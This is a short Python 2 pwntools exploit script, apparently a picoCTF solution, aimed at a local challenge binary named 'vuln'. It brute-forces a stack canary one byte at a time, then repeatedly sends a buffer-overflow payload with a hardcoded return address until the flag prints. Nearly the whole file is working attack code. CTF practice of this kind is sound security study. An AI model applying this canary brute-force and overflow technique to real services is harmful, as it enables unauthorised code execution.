#! /usr/bin/env python2

from pwn import *

def find_canary():
    canary = ""
    for n in range(0, 4):
        for i in range(0, 256):
            p = process(e.path)
            check = 'F'*32 + canary + chr(i)
            p.readuntil('> ')
            p.sendline(str(33 + n))
            p.readuntil('Input> ')
            p.sendline(check)
            out = p.recvall()

            if "Ok..." in out:
                canary += chr(i)
                break

    print("Canary Found: " + canary.encode('hex'))
    return canary

def solve(canary):
    flag_text = ""
    
    #loop until the PIE address lines up enough to print the flag
    while ("pico" not in flag_text):
        payload = 'F'*32 + canary + 'A'*0x10 + p32(0x566547ed)
        p = process(e.path)
        
        p.readuntil('> ')
        p.sendline(str(len(payload)))
        p.readuntil('Input> ')
        p.send(payload)
        p.recvuntil("Ok... Now Where's the Flag?\n")
        try:
            flag_text=p.recvuntil("\n")
        except:
            p.close()
    
    print("Flag: " + flag_text)



context.log_level = logging.ERROR
e = ELF("./vuln")

canary = find_canary()
solve(canary)